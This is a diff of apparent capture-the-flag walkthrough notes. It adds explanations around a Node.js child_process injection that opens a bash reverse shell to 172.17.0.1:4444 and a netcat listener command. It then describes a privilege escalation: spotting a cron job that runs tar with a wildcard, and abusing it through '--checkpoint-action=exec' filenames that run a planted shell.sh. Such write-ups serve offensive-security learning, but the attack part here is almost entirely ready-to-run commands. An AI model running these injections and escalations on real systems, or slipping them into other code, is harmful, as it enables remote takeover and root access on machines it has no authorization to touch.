@@ -1,12 +1,24 @@
-require('child_process').execSync('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"')
+injection - "require('child_process').execSync('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"')" 
+
+run "nc -lvnp 4444" on attacker machine
+
+
+in reverse shell:
+
+find clue in readme.txt
+
+ps aux -  to look for cron
+
+then look for fire /etc/cron.d/tar_job 
+
+cron is running tar with "*" so it's vulnerable for tar wildcard exploit.
+
+to exploit this vilnerability:
 
 cd /var/logs
 
 echo "" > "--checkpoint=1"
 echo "" > "--checkpoint-action=exec=sh shell.sh"
-
-
-rm -f /var/logs/shell.sh
 
 cat <<EOF > /var/logs/shell.sh
 #!/bin/bash
@@ -14,5 +26,7 @@ cat <<EOF > /var/logs/shell.sh
 EOF
 
 chmod +x /var/logs/shell.sh
+
+run "nc -lvnp 4444" on attacker machine
 
 
